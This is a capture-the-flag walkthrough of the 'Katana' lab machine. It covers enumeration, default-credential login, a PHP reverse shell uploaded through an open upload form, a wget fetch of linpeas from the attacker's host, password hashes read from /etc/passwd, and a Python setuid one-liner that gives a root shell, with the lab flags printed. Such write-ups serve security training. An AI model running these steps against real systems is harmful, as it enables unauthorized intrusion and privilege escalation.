# Katana

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.149.83
```

Open ports discovered:

- **21** — FTP (vsftpd 3.0.3)
- **22** — SSH (OpenSSH 7.9p1 Debian 10+deb10u2, protocol 2.0)
- **80** — HTTP (Apache httpd 2.4.38, Debian)
  - Additional webpages:
    - `http://192.168.149.83/ebook/`
- **139** — NetBIOS-SSN (Samba smbd 4.9.5-Debian, workgroup: WORKGROUP)
- **445** — NetBIOS-SSN (Samba smbd 4.9.5-Debian, workgroup: WORKGROUP)
- **7080** — HTTPS (LiteSpeed httpd)
  - Additional webpages:
    - `https://192.168.149.83:7080/docs/`
- **8088** — HTTP (LiteSpeed httpd)
  - Additional webpages:
    - `http://192.168.149.83:8088/.htaccess`
    - `http://192.168.149.83:8088/blocked/`
    - `http://192.168.149.83:8088/docs/`
    - `http://192.168.149.83:8088/phpinfo.php`
    - `http://192.168.149.83:8088/protected/`
    - `http://192.168.149.83:8088/upload.php`
    - `http://192.168.149.83:8088/upload.html`
- **8715** — HTTP (nginx 1.14.2)

Enumerated SMB using `enum4linux-ng`:

```
enum4linux-ng 192.168.149.83 -A -Gm -R -t 15
```

The Unix user `katana` (RID 1000) was discovered.

Visiting `http://192.168.149.83` displayed an image of a katana. The `/ebook/` subdirectory contained a PHP-based online web store with an admin login page at `http://192.168.149.83/ebook/admin.php`. Logging in with the default credentials `admin:admin` revealed an error when adding a new book (`Incorrect integer value: '' for column books.publisherid`), indicating that an existing publisher ID must be specified.

Directory busting on `/ebook/` revealed `readme.txt.txt` and the database dump `www_project.sql`. The readme confirmed the admin credentials and noted the database name (`www_project`), MySQL version (5.6.25), and PHP version (5.6.11). The SQL dump listed existing publishers (Wrox, Wiley, O'Reilly Media, Apress, Packt Publishing, Addison-Wesley), which would be needed when adding books through the admin panel.

Uploaded a PHP reverse shell to the file upload form at `http://192.168.149.83:8088/upload.html`. The upload response indicated the file was moved to a different web server:

```
Moved to other web server: /tmp/phpRcS2ia ====> /opt/manager/html/katana_reverse_shell.php
```

The uploaded shell was placed at `/opt/manager/html/katana_reverse_shell.php`. Accessing it at the various known ports returned 404, but the nginx service on port 8715 accepted the request. Caught the reverse shell with `penelope`:

```
www-data@lab-pg-10-debian10-katana-242-099:/$ whoami
www-data
```

Retrieved the local flag:

```
www-data@lab-pg-10-debian10-katana-242-099:/$ cat /var/www/local.txt
0171380f2a41296b11000ef0a278c82a
```

## Privilege escalation

Uploaded `linpeas.sh` to the target via `wget`:

```
www-data@lab-pg-10-debian10-katana-242-099:/tmp$ wget http://192.168.45.198:9001/linpeas.sh
```

Ran `linpeas.sh` to enumerate privilege escalation vectors. **NOTE:** `pwnkit`, `copyfail`, and `DirtyFrag` did not work on this box.

Two password hashes were found in `/etc/passwd` for `root` and `katana`:

```
/etc/passwd:root:$6$tYw4J1W.mXCmwbGt$4fzFKLA4AwjuuQM7ToRtrUvDqnuqbm0mbAMz91Bfd/wc5rYfdrI5Qz0QyT935PsuQl8bRUF/EHilSZfR/bGK/.
/etc/passwd:katana:$6$dX6scf3V2g2lMuzx$OP1qOSkNIaKL9cnGKObhRTJxeo9p0BwyOzsISHQGPvnTajSuxZN6eZ9U4GBY8mYsPRYuzrejhiTPsp45haxY2/
```

Hash cracking with `hashcat` (mode 1800, SHA-512 crypt) against `rockyou.txt` was taking too long, so this was abandoned as the intended path.

The key finding from `linpeas.sh` was that Python 2.7 had the `cap_setuid+ep` capability set:

```
/usr/bin/python2.7 = cap_setuid+ep
```

Used the GTFOBins reference for Python capabilities to craft the root shell command ([GTFOBins — Python](https://gtfobins.org/gtfobins/python/#shell)):

```
www-data@lab-pg-10-debian10-katana-242-099:/tmp$ python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'

# whoami
root
```

Retrieved the proof flag:

```
# cd /root
# cat proof.txt
c33e69f395e788c248cc17fb474fae10
```
